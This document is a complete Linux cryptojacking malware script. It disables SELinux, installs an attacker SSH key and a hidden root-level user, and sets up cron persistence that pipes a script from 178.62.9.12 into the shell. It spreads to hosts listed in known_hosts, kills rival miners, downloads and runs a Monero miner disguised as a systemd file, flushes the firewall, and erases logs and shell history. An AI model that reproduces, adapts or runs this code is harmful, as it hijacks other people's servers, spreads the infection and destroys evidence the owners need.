HISTFILE=/dev/null
setenforce 0 2>/dev/null
echo SELINUX=disabled > /etc/sysconfig/selinux 2>/dev/null
sync && echo 3 >/proc/sys/vm/drop_caches
ulimit -n 50000
ulimit -u 50000

mkdir -p /root/.ssh 2>/dev/null
chattr -R -i /root/.ssh/
find /root/.ssh -type f | xargs grep -i "redis" | xargs rm -rf
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPY3Xzdh/cxF5BA/pRiq7YcqCBr+OYty4OC1K5iphZY+jqTp2iuhQaiwbGeIUCfEpqVOHkUqmypFcje1kAGmJ0vbs1tuQ66wwXKN0kBErIyPWC6J9ocn8RQgsYUgHQwWzbixR7cZze+U3e1WHWkaw1JB/qb2hJ2iFS0AqhbUw7Cb8FrahPWliAG+dGfCtj8du4rnqQUfn3qXXuhzpUQcTjlWR20n2/6PpJMaLcbem57fDZfpavqbD9fhaV9CmfVtqsdu0drTY4oFhoSKHPshlPcyUOrPQ7UPq111iF9+BNRA5PcdvT9JOralNZLn7lbuPG68juOU0bBRxt9E7RCXY3 aaa' > /root/.ssh/authorized_keys
chattr -R +i /root/.ssh/

useradd -p '$1$T3k3IXaB$KiuKJNLRep3wxhXZ9Y1uV.' -G root openssl 2>/dev/null
usermod -o -u 0 -g 0 openssl 2>/dev/null
sed 's/home\/openssl//g' /etc/passwd 2>/dev/null

miner_root="/usr/lib/systemd/"
miner_url="http://178.62.9.12/lsmb"
miner_url_backup="http://207.154.212.186/lsmb"
miner_size="854364"
miner_path=$miner_root"systemd-update-daily"
config_url="http://178.62.9.12/config.json"
config_url_backup="http://207.154.212.186/config.json"
config_size="4954"
config_path=$miner_root"config.json"
cron="*/30 * * * * curl -fsSL http://178.62.9.12/system_update_daily.sh | sh"

if [ -f /root/.ssh/known_hosts ] && [ -f /root/.ssh/id_rsa.pub ]; then
  for h in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" /root/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h 'curl -o-  http://178.62.9.12/system_update_daily.sh | bash >/dev/null 2>&1 &' & done
fi

add_cron()
{
    chattr -R -i /var/spool/cron
    chattr -i /etc/crontab
    crontab -r 2>/dev/null
    rm -rf /etc/crontab
    rm -rf /var/spool/cron/* 2>/dev/null
    mkdir -p /var/spool/cron/crontabs 2>/dev/null
    echo "$cron" > /var/spool/cron/root
    echo "$cron" > /var/spool/cron/crontabs/root
    echo "$cron" | crontab -
    echo "$cron" > /etc/crontab
    chattr -R +i /var/spool/cron
    chattr +i /etc/crontab
}

download()
{
    chattr -i $2
    if [ -f "/usr/bin/curl" ]
    then 
        echo $1,$2
        http_code=`curl -I -m 10 -o /dev/null -s -w %{http_code} $1`
        if [ "$http_code" -eq "200" ]
        then
            curl --connect-timeout 10 --retry 100 $1 > $2
        elif [ "$http_code" -eq "405" ]
        then
            curl --connect-timeout 10 --retry 100 $1 > $2
        else
            curl --connect-timeout 10 --retry 100 $3 > $2
        fi
    elif [ -f "/usr/bin/cur" ]
    then
        http_code = `cur -I -m 10 -o /dev/null -s -w %{http_code} $1`
        if [ "$http_code" -eq "200" ]
        then
            cur --connect-timeout 10 --retry 100 $1 > $2
        elif [ "$http_code" -eq "405" ]
        then
            cur --connect-timeout 10 --retry 100 $1 > $2
        else
            cur --connect-timeout 10 --retry 100 $3 > $2
        fi
    elif [ -f "/usr/bin/wget" ]
    then
        wget --timeout=10 --tries=100 -O $2 $1
        if [ $? -ne 0 ]
        then
            wget --timeout=10 --tries=100 -O $2 $3
        fi
    elif [ -f "/usr/bin/wge" ]
    then
        wge --timeout=10 --tries=100 -O $2 $1
        if [ $? -eq 0 ]
        then
            wge --timeout=10 --tries=100 -O $2 $3
        fi
    fi
    chmod 777 $2
    touch -r /bin/ls $2
    chattr +i $2
}

download_miner()
{
    mkdir -p $miner_root 2>/dev/null
    if [ ! -f "$miner_path" ]
    then
        download $config_url $config_path $config_url_backup
        chattr -i $config_path
        if [ `getconf LONG_BIT` = "64" ]
        then
            download $miner_url $miner_path $miner_url_backup
        else
            echo "no 32 bit miner"
        fi
    else
        echo "no need download"
    fi
}

kill_aliyunone_proc()
{
    cd /usr/bin
    ls -at ./ | head | grep "^[a-z][0-9a-z]\{9\}$" | grep "[0-9]" | xargs rm -rf 
    cd /usr/sbin
    ls -at ./ | head | grep "^[a-z][0-9a-z]\{9\}$" | grep "[0-9]" | xargs rm -rf 
    cd /usr/local/bin
    ls -at ./ | head | grep "^[a-z][0-9a-z]\{9\}$" | grep "[0-9]" | xargs rm -rf 
    
    #systemctl stop crond.service
    #service crond stop
    #chkconfig crond off

    #echo > /var/spool/cron/root
    #echo > /var/spool/cron/crontabs/root
    #echo > /etc/cron.d/root
    #chattr -R +i /var/spool/cron/

    #echo > /etc/crontab
    #chattr +i /etc/crontab
    
    chattr -i /etc/hosts
    echo "127.0.0.1 aliyun.one" >> /etc/hosts
    echo "127.0.0.1 cpuminerpool.com" >> /etc/hosts
    chattr +i /etc/hosts

    chattr -i /etc/bashrc
    sed -i '/aliyun.one/d' /etc/bashrc
    chattr +i /etc/bashrc
}

kill_miner_proc()
{
    ps auxf|grep -v grep|grep "cpuminerpool.com"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "mine.moneropool.com"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "pool.t00ls.ru"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:8080"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:3333"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "zhuabcn@yahoo.com"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "monerohash.com"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "/tmp/a7b104c270"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:6666"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:7777"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:443"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "stratum.f2pool.com:8888"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "xmrpool.eu" | awk '{print $2}'|xargs kill -9
    ps auxf|grep xiaoyao| awk '{print $2}'|xargs kill -9
    ps auxf|grep xiaoxue| awk '{print $2}'|xargs kill -9
    ps ax|grep var|grep lib|grep jenkins|grep -v httpPort|grep -v headless|grep "\-c"|xargs kill -9
    ps ax|grep -o './[0-9]* -c'| xargs pkill -f
    pkill -f biosetjenkins
    pkill -f Loopback
    pkill -f apaceha
    pkill -f cryptonight
    pkill -f stratum
    pkill -f mixnerdx
    pkill -f performedl
    pkill -f JnKihGjn
    pkill -f irqba2anc1
    pkill -f irqba5xnc1
    pkill -f irqbnc1
    pkill -f ir29xc1
    pkill -f conns
    pkill -f irqbalance
    pkill -f crypto-pool
    pkill -f minexmr
    pkill -f XJnRj
    pkill -f mgwsl
    pkill -f pythno
    pkill -f jweri
    pkill -f lx26
    pkill -f NXLAi
    pkill -f BI5zj
    pkill -f askdljlqw
    pkill -f minerd
    pkill -f minergate
    pkill -f Guard.sh
    pkill -f ysaydh
    pkill -f bonns
    pkill -f donns
    pkill -f kxjd
    pkill -f Duck.sh
    pkill -f bonn.sh
    pkill -f conn.sh
    pkill -f kworker34
    pkill -f kw.sh
    pkill -f pro.sh
    pkill -f polkitd
    pkill -f acpid
    pkill -f icb5o
    pkill -f nopxi
    pkill -f irqbalanc1
    pkill -f i586
    pkill -f gddr
    pkill -f mstxmr
    pkill -f ddg.2011
    pkill -f wnTKYg
    pkill -f deamon
    pkill -f disk_genius
    pkill -f sourplum
    pkill -f nanoWatch
    pkill -f zigw
    pkill -f devtool
    pkill -f systemctI
    pkill -f WmiPrwSe
    pkill -f sysguard
    pkill -f sysupdate
    pkill -f networkservice
    pkill -f systemd-update-daily
}

kill_sus_proc()
{
    ps axf -o "pid"|while read procid
    do
            ls -l /proc/$procid/exe | grep /tmp
            if [ $? -ne 1 ]
            then
                    cat /proc/$procid/cmdline| grep -a -E "init.sh|ash.sh|bsh.sh|rsh.sh|sysguard|update.sh|sysupdate|networkservice"
                    if [ $? -ne 0 ]
                    then
                            kill -9 $procid
                    else
                            echo "don't kill"
                    fi
            fi
    done
    ps axf -o "pid %cpu" | awk '{if($2>=40.0) print $1}' | while read procid
    do
            cat /proc/$procid/cmdline| grep -a -E "init.sh|ash.sh|bsh.sh|rsh.sh|sysguard|update.sh|sysupdate|networkservice"
            if [ $? -ne 0 ]
            then
                    kill -9 $procid
            else
                    echo "don't kill"
            fi
    done
}

kill_miner_proc
kill_sus_proc
kill_aliyunone_proc
add_cron
download_miner

mount -t proc none /proc

echo 128 > /proc/sys/vm/nr_hugepages
sysctl -w vm.nr_hugepages=128
nohup $miner_path &

iptables -F
service iptables reload
ps auxf|grep -v grep|grep "stratum"|awk '{print $2}'|xargs kill -9
history -c
echo > /var/spool/mail/root
echo > /var/log/wtmp
echo > /var/log/secure
echo > /root/.bash_history



